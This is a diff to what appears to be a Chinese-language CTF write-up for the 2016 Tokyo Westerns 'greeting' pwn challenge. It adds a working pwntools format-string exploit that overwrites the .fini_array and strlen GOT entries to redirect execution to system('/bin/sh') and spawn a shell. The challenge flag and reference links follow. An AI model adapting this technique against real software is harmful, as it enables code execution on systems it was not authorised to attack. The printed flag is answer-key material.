@@ -24,10 +24,69 @@
 
 #### exploit.py
 ```
+from pwn import *
 
+# Establish the target process
+r = process('greeting')
+gdb.attach(r, gdbscript = 'b *0x0804864f')
+
+# The values we will be overwritting
+finiArray = 0x08049934
+strlenGot = 0x08049a54
+
+# The values we will be overwritting with
+getline = 0x8048614
+systemPlt = 0x8048490
+
+# Establish the format string
+payload = ""
+
+# Just a bit of padding
+payload += "xx"
+
+# Address of fini array
+payload += p32(finiArray)
+
+# Address of fini array + 2
+payload += p32(finiArray + 2)
+
+# Address of got entry for strlen
+payload += p32(strlenGot)
+
+# Address of got entry for strlen + 2
+payload += p32(strlenGot + 2)
+
+# Write the lower two bytes of the fini array with loop around address (getline setup)
+payload += "%34288x"
+payload += "%12$n"
+
+# Write the lower two bytes of the plt system address to the got strlen entry
+payload += "%65148x"
+payload += "%14$n"
+
+# Write the higher two bytes of the two address we just wrote to
+# Both are the same (0x804)
+payload += "%33652x"
+payload += "%13$n"
+payload += "%15$n"
+
+# Print the length of our fmt string (make sure we meet the size requirement)
+print "len: " + str(len(payload))
+
+# Send the format string
+r.sendline(payload)
+
+# Send '/bin/sh' to trigger the system('/bin/sh') call
+r.sendline('/bin/sh')
+
+# Drop to an interactive shell
+r.interactive()
 ```
+這樣就可以順利找出 flag 了。
+TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}
 
 #### 參考資料
 * https://nuc13us.wordpress.com/2016/09/05/tokyo-westernsmma-ctf-2nd-2016-greeting-150pwn/
 * https://bruce30262.github.io/mma-2nd-ctf-2016-greeting/
+* https://github.com/guyinatuxedo/ctf/blob/master/tokyowesterns16/pwn/greeting/exploit.py
 * https://systemoverlord.com/2014/02/12/printf-format-string-exploitation/
